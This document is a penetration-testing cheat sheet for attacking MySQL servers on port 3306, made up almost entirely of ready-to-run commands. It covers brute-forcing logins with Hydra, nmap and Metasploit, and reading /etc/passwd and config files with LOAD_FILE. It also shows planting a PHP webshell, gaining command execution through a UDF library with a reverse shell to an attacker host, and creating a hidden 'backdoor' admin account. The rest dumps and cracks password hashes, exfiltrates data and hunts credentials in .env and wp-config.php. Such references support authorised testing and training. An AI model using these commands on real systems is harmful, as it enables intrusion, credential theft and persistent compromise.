# Port 3306 - MySQL

## Table of Contents
- [Enumeration](#enumeration)
  - [Connect](#connect)
  - [Nmap Scripts](#nmap-scripts)
  - [Database Enumeration](#database-enumeration)
  - [User Enumeration](#user-enumeration)
- [Brute Force](#brute-force)
- [Exploit](#exploit)
  - [File Operations](#file-operations)
  - [UDF RCE](#udf-rce)
  - [Webshell Upload](#webshell-upload)
- [Post-Exploitation](#post-exploitation)

---

## Enumeration

### Connect

```shell
# Local connection
mysql -u root -p

# Remote connection
mysql -u username -h $rhost -P 3306 -p

# Execute query directly
mysql -u username -p -e "SELECT @@version;"

# Skip SSL
mysql -h $rhost -u root -p --skip-ssl
```

### Basic SQL Queries

```shell
# Version
SELECT @@version;
SELECT VERSION();

# Databases
SHOW DATABASES;
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;

# Current database
SELECT DATABASE();

# Tables
SHOW TABLES;
USE database_name;
SELECT * FROM users;
```

### Nmap Scripts

```shell
# Service detection
nmap -p 3306 -sV $rhost

# Brute force
nmap -p 3306 --script mysql-brute $rhost
```

### Database Enumeration

```shell
# Database size
SELECT table_schema AS 'Database',
  ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.TABLES GROUP BY table_schema;

# List tables
SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE();

# List columns
SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';

# Find sensitive columns
SELECT table_name, column_name FROM information_schema.COLUMNS
WHERE column_name LIKE '%password%' OR column_name LIKE '%pass%';
```

### User Enumeration

```shell
# List MySQL users
SELECT user, host FROM mysql.user;

# Current user
SELECT USER();
SELECT CURRENT_USER();

# User privileges
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';

# Check FILE privilege
SELECT file_priv FROM mysql.user WHERE user='current_user';
```

### Metasploit Modules

```shell
# Version detection
use auxiliary/scanner/mysql/mysql_version
set RHOSTS $rhost
run

# Enumerate users and privileges
use auxiliary/admin/mysql/mysql_enum
set RHOSTS $rhost
set USERNAME root
set PASSWORD password
run

# Dump schema
use auxiliary/scanner/mysql/mysql_schemadump

# Extract password hashes
use auxiliary/scanner/mysql/mysql_hashdump
```

---

## Brute Force

### Hydra

```shell
hydra -L users.txt -P passwords.txt -f mysql://$rhost
```

### Nmap

```shell
nmap -p 3306 --script mysql-brute $rhost
```

### Metasploit

```shell
use auxiliary/scanner/mysql/mysql_login
set RHOSTS $rhost
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

---

## Exploit

### File Operations

> Requires FILE privilege

#### Read Files

```shell
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\Windows\\win.ini');

# Hex encoding (bypasses binary issues)
SELECT HEX(LOAD_FILE('/etc/passwd'));
```

#### Write Files

```shell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT 'backdoor content' INTO OUTFILE '/tmp/backdoor.txt';
```

#### Check Restrictions

```shell
SHOW VARIABLES LIKE 'secure_file_priv';
```

### UDF RCE

> User Defined Functions for remote code execution

```shell
# Check plugin directory
SHOW VARIABLES LIKE 'plugin_dir';

# Compile and upload UDF library
# Then load into MySQL
SELECT 0x[hex_encoded_library] INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys_exec.so';

# Create function
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_sys_exec.so';

# Execute commands
SELECT sys_exec('whoami');
SELECT sys_exec('bash -i >& /dev/tcp/attacker-ip/4444 0>&1');
```

### Webshell Upload

```shell
# PHP webshell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Access: http://target.com/shell.php?cmd=whoami
```

---

## Post-Exploitation

### Password Hash Extraction

```shell
# MySQL < 5.7
SELECT user, password FROM mysql.user;

# MySQL >= 5.7
SELECT user, authentication_string FROM mysql.user;

# Export hashes
SELECT user, authentication_string FROM mysql.user INTO OUTFILE '/tmp/hashes.txt';
```

### Hash Cracking

```shell
# Extract hashes
mysql -u root -p -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user" > mysql_hashes.txt

# Crack with hashcat (MySQL 5+)
hashcat -m 300 mysql_hashes.txt rockyou.txt

# John the Ripper
john --format=mysql-sha1 mysql_hashes.txt
```

### Privilege Escalation

```shell
# Create admin user
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

# Grant FILE privilege
GRANT FILE ON *.* TO 'username'@'localhost';
FLUSH PRIVILEGES;
```

### Data Exfiltration

```shell
# Export to CSV
SELECT * FROM sensitive_table INTO OUTFILE '/tmp/data.csv'
FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n';

# Concatenate and export
SELECT CONCAT(username, ':', password) FROM users INTO OUTFILE '/tmp/credentials.txt';
```

### Credential Hunting

```shell
# Configuration files
cat /etc/mysql/debian.cnf
cat /etc/mysql/my.cnf
cat ~/.my.cnf
cat ~/.mysql_history

# Application config files
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/.env
```